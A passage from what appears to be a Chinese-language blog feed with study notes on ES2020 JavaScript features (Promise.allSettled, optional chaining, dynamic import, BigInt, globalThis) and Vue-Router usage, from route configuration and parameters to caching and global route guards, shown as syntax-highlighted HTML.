punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">let</span> p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'用户数据1'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//返回结果始终是成功的,成功的值是每一个promise对象执行的结果(异步任务执行完的值和执行状态)</span><span class="token keyword">let</span> result <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">allSettled</span><span class="token punctuation">(</span><span class="token punctuation">[</span>p<span class="token punctuation">,</span>p2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">//Promise.all  接收一个Promise数组</span><span class="token comment">//与allSettled的区别是?</span><span class="token comment">//它的返回结果根据每一个promise对象状态决定的,如果每一个promise都是成功的状态,返回的结果也是成功的promise对象</span><span class="token comment">//如果有一个是失败的,返回的promise就是失败的</span><span class="token comment">//全部成功才会返回成功的promise</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><h3 id="4-可选链操作符"><a href="#4-可选链操作符" class="headerlink" title="4. 可选链操作符"></a>4. 可选链操作符</h3>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//?.(可选链操作符)</span>  <span class="token comment">//何时用? </span>  <span class="token comment">//当应对对象类型的参数时,层级嵌套比较深.有了这个之后,我们就不用进行层层判断了</span>    <span class="token comment">//定义对象(嵌套)</span>  <span class="token keyword">let</span> stu <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    name<span class="token operator">:</span> <span class="token string">'张三'</span><span class="token punctuation">,</span>    info<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      xx<span class="token operator">:</span> <span class="token string">'法外狂徒'</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token parameter">config</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// const Info = config &amp;&amp; config.info &amp;&amp; config.info.xx</span>    <span class="token comment">//值?. 判断可选链操作符(?.)前面的值有没有传入</span>    <span class="token comment">//如果没有传入,会返回undefined</span>    <span class="token keyword">const</span> Info <span class="token operator">=</span> config<span class="token operator">?.</span>info<span class="token operator">?.</span>xx    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Info<span class="token punctuation">)</span> <span class="token comment">//法外狂徒</span>  <span class="token punctuation">&#125;</span>  <span class="token function">main</span><span class="token punctuation">(</span>stu<span class="token punctuation">)</span></code></pre><h3 id="5-动态-import-导入"><a href="#5-动态-import-导入" class="headerlink" title="5. 动态 import 导入"></a>5. 动态 import 导入</h3> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">// 结构部分</span><span class="token operator">&lt;</span>button id<span class="token operator">=</span><span class="token string">"btn"</span><span class="token operator">></span>点击<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"module"</span> src<span class="token operator">=</span><span class="token string">"./js/Dtyr.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token comment">//获取元素</span> <span class="token comment">// ./js/Dtyr.js</span><span class="token keyword">const</span> btn <span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>btn<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//import(参数) 参数为引入的路径</span>  <span class="token comment">//动态引入import(相当于懒加载,需要时再引入)</span>  <span class="token comment">//返回的结果是promise对象</span>  <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./dtyr2.js'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>    item<span class="token punctuation">.</span><span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-js" data-language="js"><code class="language-js"> <span class="token comment">// ./dtyr2.js</span> <span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><h3 id="6-BigInt"><a href="#6-BigInt" class="headerlink" title="6. BigInt"></a>6. BigInt</h3><p> BigInt 大整数,大整形 主要用于大数值运算<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//表示方式 在普通整型数组的基础上后面加n,n表示大整形</span> <span class="token keyword">let</span> num <span class="token operator">=</span> <span class="token number">123n</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span><span class="token keyword">typeof</span> num<span class="token punctuation">)</span> <span class="token comment">//123n 'bigint'</span> <span class="token comment">//BigInt() 函数  可以将一个普通整数值转换为大整形的值</span> <span class="token comment">//不能使用浮点数(小数)来转换</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">BigInt</span><span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//125n</span> <span class="token comment">// console.log(BigInt(1.4)) //报错</span> <span class="token comment">//Number.MAX_SAFE_INTEGER 最大安全整数</span> <span class="token keyword">const</span> max <span class="token operator">=</span> Number<span class="token punctuation">.</span><span class="token constant">MAX_SAFE_INTEGER</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span> <span class="token comment">//9007199254740991</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>max<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>max<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">//运算出错,不能再表示更大运算正确的运算结果</span> <span class="token comment">//可以借助BigInt来运算更大的结果</span> <span class="token comment">//BigInt类型不能直接和普通Int类型做运算,必须将Int类型转换为BigInt类型</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">BigInt</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//9007199254740991n</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">BigInt</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">BigInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//9007199254740992n</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">BigInt</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">BigInt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//9007199254740993n</span></code></pre></p><h3 id="7-globalThis-对象"><a href="#7-globalThis-对象" class="headerlink" title="7. globalThis 对象"></a>7. globalThis 对象</h3> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//globalThis 全局this,始终指向全局对象</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>globalThis<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue-Router</title>
      <link href="/2021/12/19/vue-router/"/>
      <url>/2021/12/19/vue-router/</url>
      
        <content type="html"><![CDATA[<h1 id="VueRouter"><a href="#VueRouter" class="headerlink" title="VueRouter"></a>VueRouter</h1><a id="more"></a><h2 id="一、什么是路由"><a href="#一、什么是路由" class="headerlink" title="一、什么是路由"></a>一、什么是路由</h2><h3 id="1-理解"><a href="#1-理解" class="headerlink" title="1. 理解"></a>1. 理解</h3><p> 一个路由(route)就是一组映射关系(key-value),多个路由需要路由器(router)进行管理</p><h3 id="2-前端路由"><a href="#2-前端路由" class="headerlink" title="2. 前端路由"></a>2. 前端路由</h3><p> key是路径,value是组件</p><h2 id="二、路由的基本使用"><a href="#二、路由的基本使用" class="headerlink" title="二、路由的基本使用"></a>二、路由的基本使用</h2><h3 id="①-安装"><a href="#①-安装" class="headerlink" title="① 安装"></a>① 安装</h3><p> 安装vue-router,命令: <code>npm i vue-router</code></p><h3 id="②-应用"><a href="#②-应用" class="headerlink" title="② 应用"></a>② 应用</h3><p> 应用插件: <code>Vue.use(VueRouter)</code></p><h3 id="③-编写router配置项"><a href="#③-编写router配置项" class="headerlink" title="③ 编写router配置项"></a>③ 编写router配置项</h3> <pre class="language-js" data-language="js"><code class="language-js">  <span class="token comment">//引入VueRouter</span><span class="token keyword">import</span> VueRouter <span class="token keyword">from</span> <span class="token string">'vue-router'</span><span class="token comment">//引入Luyou 组件</span><span class="token keyword">import</span> About <span class="token keyword">from</span> <span class="token string">'../components/About'</span><span class="token keyword">import</span> Home <span class="token keyword">from</span> <span class="token string">'../components/Home'</span><span class="token comment">//创建router实例对象，去管理一组一组的路由规则</span><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>routes<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>path<span class="token operator">:</span><span class="token string">'/about'</span><span class="token punctuation">,</span>component<span class="token operator">:</span>About<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>path<span class="token operator">:</span><span class="token string">'/home'</span><span class="token punctuation">,</span>component<span class="token operator">:</span>Home<span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="④-实现切换-active-class可配置高亮样式"><a href="#④-实现切换-active-class可配置高亮样式" class="headerlink" title="④ 实现切换(active-class可配置高亮样式)"></a>④ 实现切换(active-class可配置高亮样式)</h3><p> <code>&lt;router-link active-class=&quot;active&quot; to=&quot;/about&quot;&gt;About&lt;/router-link&gt;</code></p><h3 id="⑤-指定展示位置"><a href="#⑤-指定展示位置" class="headerlink" title="⑤ 指定展示位置"></a>⑤ 指定展示位置</h3><p> <code>&lt;router-view&gt;&lt;/router-view&gt;</code></p><h2 id="三、几个注意点"><a href="#三、几个注意点" class="headerlink" title="三、几个注意点"></a>三、几个注意点</h2><p> Ⅰ.路由组件通常存放在<code>pages</code>文件夹,一般组件通常存放在<code>components</code>文件夹</p><p> Ⅱ.通过切换,”隐藏”了的路由组件,默认是被销毁掉的,需要的时候再去挂载</p><p> Ⅲ.每个组件都有自己的$route属性,里面存储着自己的路由信息</p><p> Ⅳ.整个应用只有一个router,可以通过组件的<code>$router</code>属性获取到</p><h2 id="四、多级路由"><a href="#四、多级路由" class="headerlink" title="四、多级路由"></a>四、多级路由</h2><h3 id="1-配置路由规则"><a href="#1-配置路由规则" class="headerlink" title="1. 配置路由规则"></a>1. 配置路由规则</h3><p> 配置路由规则,使用children配置项<br> <pre class="language-js" data-language="js"><code class="language-js"> routes<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>path<span class="token operator">:</span><span class="token string">'/about'</span><span class="token punctuation">,</span>component<span class="token operator">:</span>About<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>path<span class="token operator">:</span><span class="token string">'/home'</span><span class="token punctuation">,</span>component<span class="token operator">:</span>Home<span class="token punctuation">,</span>children<span class="token operator">:</span><span class="token punctuation">[</span> <span class="token comment">//通过children配置子级路由</span><span class="token punctuation">&#123;</span>path<span class="token operator">:</span><span class="token string">'news'</span><span class="token punctuation">,</span> <span class="token comment">//此处一定不要写：/news</span>component<span class="token operator">:</span>News<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>path<span class="token operator">:</span><span class="token string">'message'</span><span class="token punctuation">,</span><span class="token comment">//此处一定不要写：/message</span>component<span class="token operator">:</span>Message<span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span></code></pre></p><h3 id="2-跳转"><a href="#2-跳转" class="headerlink" title="2. 跳转"></a>2. 跳转</h3><p> <code>&lt;router-link to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;</code></p><h2 id="五、路由的query参数"><a href="#五、路由的query参数" class="headerlink" title="五、路由的query参数"></a>五、路由的query参数</h2><p> 1.传递参数<br>  <pre class="language-js" data-language="js"><code class="language-js">  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 跳转并携带query参数，to的字符串写法 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>router<span class="token operator">-</span>link <span class="token operator">:</span>to<span class="token operator">=</span><span class="token string">"/home/message/detail?id=666&amp;title=你好"</span><span class="token operator">></span>跳转<span class="token operator">&lt;</span><span class="token operator">/</span>router<span class="token operator">-</span>link<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 跳转并携带query参数，to的对象写法 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>router<span class="token operator">-</span>link <span class="token operator">:</span>to<span class="token operator">=</span>"<span class="token punctuation">&#123;</span>path<span class="token operator">:</span><span class="token string">'/home/message/detail'</span><span class="token punctuation">,</span>query<span class="token operator">:</span><span class="token punctuation">&#123;</span>   id<span class="token operator">:</span><span class="token number">666</span><span class="token punctuation">,</span>            title<span class="token operator">:</span><span class="token string">'你好'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>"<span class="token operator">></span>跳转<span class="token operator">&lt;</span><span class="token operator">/</span>router<span class="token operator">-</span>link<span class="token operator">></span></code></pre></p><p> 2.接收参数<br>  <pre class="language-js" data-language="js"><code class="language-js">$route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>id$route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>title</code></pre></p><h2 id="六、命名路由"><a href="#六、命名路由" class="headerlink" title="六、命名路由"></a>六、命名路由</h2><h3 id="1-作用"><a href="#1-作用" class="headerlink" title="1. 作用"></a>1. 作用</h3><p> 可以简化路由的跳转</p><h3 id="2-如何使用"><a href="#2-如何使用" class="headerlink" title="2. 如何使用"></a>2. 如何使用</h3><p> ①给路由命名<br>  <pre class="language-js" data-language="js"><code class="language-js">  <span class="token punctuation">&#123;</span>path<span class="token operator">:</span><span class="token string">'/demo'</span><span class="token punctuation">,</span>component<span class="token operator">:</span>Demo<span class="token punctuation">,</span>children<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>path<span class="token operator">:</span><span class="token string">'test'</span><span class="token punctuation">,</span>component<span class="token operator">:</span>Test<span class="token punctuation">,</span>children<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>                      name<span class="token operator">:</span><span class="token string">'hello'</span> <span class="token comment">//给路由命名</span>path<span class="token operator">:</span><span class="token string">'welcome'</span><span class="token punctuation">,</span>component<span class="token operator">:</span>Hello<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><br> ②简化跳转<br>  <pre class="language-js" data-language="js"><code class="language-js">  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>简化前，需要写完整的路径 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>router<span class="token operator">-</span>link to<span class="token operator">=</span><span class="token string">"/demo/test/welcome"</span><span class="token operator">></span>跳转<span class="token operator">&lt;</span><span class="token operator">/</span>router<span class="token operator">-</span>link<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>简化后，直接通过名字跳转 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>router<span class="token operator">-</span>link <span class="token operator">:</span>to<span class="token operator">=</span><span class="token string">"&#123;name:'hello'&#125;"</span><span class="token operator">></span>跳转<span class="token operator">&lt;</span><span class="token operator">/</span>router<span class="token operator">-</span>link<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>简化写法配合传递参数 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>router<span class="token operator">-</span>link <span class="token operator">:</span>to<span class="token operator">=</span>"<span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'hello'</span><span class="token punctuation">,</span>query<span class="token operator">:</span><span class="token punctuation">&#123;</span>   id<span class="token operator">:</span><span class="token number">666</span><span class="token punctuation">,</span>            title<span class="token operator">:</span><span class="token string">'你好'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>"<span class="token operator">></span>跳转<span class="token operator">&lt;</span><span class="token operator">/</span>router<span class="token operator">-</span>link<span class="token operator">></span></code></pre></p><h2 id="七、路由的params参数"><a href="#七、路由的params参数" class="headerlink" title="七、路由的params参数"></a>七、路由的params参数</h2><h3 id="1-配置路由"><a href="#1-配置路由" class="headerlink" title="1. 配置路由"></a>1. 配置路由</h3><p> 配置路由,声明接收params参数<br> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token punctuation">&#123;</span>path<span class="token operator">:</span><span class="token string">'/home'</span><span class="token punctuation">,</span>component<span class="token operator">:</span>Home<span class="token punctuation">,</span>children<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>path<span class="token operator">:</span><span class="token string">'news'</span><span class="token punctuation">,</span>component<span class="token operator">:</span>News<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>component<span class="token operator">:</span>Message<span class="token punctuation">,</span>children<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span>path<span class="token operator">:</span><span class="token string">'detail/:id/:title'</span><span class="token punctuation">,</span> <span class="token comment">//使用占位符声明接收params参数</span>component<span class="token operator">:</span>Detail<span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre></p><h3 id="2-传递参数"><a href="#2-传递参数" class="headerlink" title="2. 传递参数"></a>2. 传递参数</h3> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 跳转并携带params参数，to的字符串写法 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>router<span class="token operator">-</span>link <span class="token operator">:</span>to<span class="token operator">=</span><span class="token string">"/home/message/detail/666/你好"</span><span class="token operator">></span>跳转<span class="token operator">&lt;</span><span class="token operator">/</span>router<span class="token operator">-</span>link<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 跳转并携带params参数，to的对象写法 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>router<span class="token operator">-</span>link <span class="token operator">:</span>to<span class="token operator">=</span>"<span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span>params<span class="token operator">:</span><span class="token punctuation">&#123;</span>   id<span class="token operator">:</span><span class="token number">666</span><span class="token punctuation">,</span>       title<span class="token operator">:</span><span class="token string">'你好'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>"<span class="token operator">></span>跳转<span class="token operator">&lt;</span><span class="token operator">/</span>router<span class="token operator">-</span>link<span class="token operator">></span></code></pre><p> 特别注意: 路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！</p><h3 id="3-接收参数"><a href="#3-接收参数" class="headerlink" title="3. 接收参数"></a>3. 接收参数</h3> <pre class="language-js" data-language="js"><code class="language-js">$route<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id$route<span class="token punctuation">.</span>params<span class="token punctuation">.</span>title</code></pre><h2 id="八、路由的props配置"><a href="#八、路由的props配置" class="headerlink" title="八、路由的props配置"></a>八、路由的props配置</h2><h3 id="1-作用-1"><a href="#1-作用-1" class="headerlink" title="1. 作用"></a>1. 作用</h3><p> 让路由组件更方便的收到参数<br> <pre class="language-js" data-language="js"><code class="language-js">  <span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span>path<span class="token operator">:</span><span class="token string">'detail/:id'</span><span class="token punctuation">,</span>component<span class="token operator">:</span>Detail<span class="token punctuation">,</span><span class="token comment">//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件</span><span class="token comment">// props:&#123;a:900&#125;</span><span class="token comment">//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件</span><span class="token comment">// props:true</span><span class="token comment">//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件</span><span class="token function">props</span><span class="token punctuation">(</span><span class="token parameter">route</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">&#123;</span>id<span class="token operator">:</span>route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>id<span class="token punctuation">,</span>title<span class="token operator">:</span>route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>title<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></p><h2 id="九、-lt-router-link-gt-的replace属性"><a href="#九、-lt-router-link-gt-的replace属性" class="headerlink" title="九、&lt;router-link&gt;的replace属性"></a>九、<code>&lt;router-link&gt;</code>的replace属性</h2><h3 id="1-作用-2"><a href="#1-作用-2" class="headerlink" title="1. 作用"></a>1. 作用</h3><p> 控制路由跳转时操作浏览器历史记录的模式</p><h3 id="2-浏览器历史记录写入方式"><a href="#2-浏览器历史记录写入方式" class="headerlink" title="2. 浏览器历史记录写入方式"></a>2. 浏览器历史记录写入方式</h3><p> 路由跳转时,默认是push</p><p> 浏览器的历史记录有两种写入方式<br>  ①push<br>   push是追加历史记录</p><p>  ②replace<br>   replace是替换当前记录</p><h3 id="3-如何开启replace模式"><a href="#3-如何开启replace模式" class="headerlink" title="3. 如何开启replace模式"></a>3. 如何开启<code>replace</code>模式</h3><p> <code>&lt;router-link replace .......&gt;News&lt;/router-link&gt;</code></p><h2 id="十、编程式路由导航"><a href="#十、编程式路由导航" class="headerlink" title="十、编程式路由导航"></a>十、编程式路由导航</h2><h3 id="1-作用-3"><a href="#1-作用-3" class="headerlink" title="1. 作用"></a>1. 作用</h3><p> 不借助<code>&lt;router-link&gt; </code>实现路由跳转,让路由跳转更加灵活</p><h3 id="2-具体代码"><a href="#2-具体代码" class="headerlink" title="2. 具体代码"></a>2. 具体代码</h3> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token comment">//$router的两个API</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span>params<span class="token operator">:</span><span class="token punctuation">&#123;</span>id<span class="token operator">:</span>xxx<span class="token punctuation">,</span>title<span class="token operator">:</span>xxx<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span>params<span class="token operator">:</span><span class="token punctuation">&#123;</span>id<span class="token operator">:</span>xxx<span class="token punctuation">,</span>title<span class="token operator">:</span>xxx<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//前进</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//后退</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//可前进也可后退</span></code></pre><h2 id="十一、缓存路由组件"><a href="#十一、缓存路由组件" class="headerlink" title="十一、缓存路由组件"></a>十一、缓存路由组件</h2><h3 id="1-作用-4"><a href="#1-作用-4" class="headerlink" title="1. 作用"></a>1. 作用</h3><p> 让不展示的路由保持挂载,不被销毁</p><h3 id="2-具体代码-1"><a href="#2-具体代码-1" class="headerlink" title="2. 具体代码"></a>2. 具体代码</h3><p> include = “组件名” (让组件保持活跃状态)<br> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span>keep<span class="token operator">-</span>alive include<span class="token operator">=</span><span class="token string">"News"</span><span class="token operator">></span>     <span class="token operator">&lt;</span>router<span class="token operator">-</span>view<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>router<span class="token operator">-</span>view<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>keep<span class="token operator">-</span>alive<span class="token operator">></span></code></pre></p><h2 id="十二、两个新的生命周期钩子"><a href="#十二、两个新的生命周期钩子" class="headerlink" title="十二、两个新的生命周期钩子"></a>十二、两个新的生命周期钩子</h2><h3 id="1-作用-5"><a href="#1-作用-5" class="headerlink" title="1. 作用"></a>1. 作用</h3><p> 路由组件所独有的两个钩子,用于捕获路由组件的激活状态</p><h3 id="2-钩子名称"><a href="#2-钩子名称" class="headerlink" title="2. 钩子名称"></a>2. 钩子名称</h3><ol><li><p><code>activated</code>路由组件被激活时触发</p></li><li><p><code>deactivated</code>路由组件失活时触发</p></li></ol><h2 id="十三、路由守卫"><a href="#十三、路由守卫" class="headerlink" title="十三、路由守卫"></a>十三、路由守卫</h2><h3 id="1-作用-6"><a href="#1-作用-6" class="headerlink" title="1. 作用"></a>1. 作用</h3><p> 对路由进行权限控制</p><h3 id="2-分类"><a href="#2-分类" class="headerlink" title="2. 分类"></a>2. 分类</h3><p> 全局守卫、独享守卫、组件内守卫</p><h3 id="3-全局守卫"><a href="#3-全局守卫" class="headerlink" title="3. 全局守卫"></a>3. 全局守卫</h3> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token comment">//全局前置守卫：初始化时执行、每次路由切换前执行</span>router<span class="token punctuation">.</span><span class="token function">beforeEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span><span class="token keyword">from</span><span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeEach'</span><span class="token punctuation">,</span>to<span class="token punctuation">,</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>isAuth<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//判断当前路由是否需要进行权限控制</span><span class="token keyword">if</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'school'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'atguigu'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//权限控制的具体规则</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//放行</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'暂无权限查看'</span><span class="token punctuation">)</span><span class="token comment">// next(&#123;name:'guanyu'&#125;)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//放行</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token 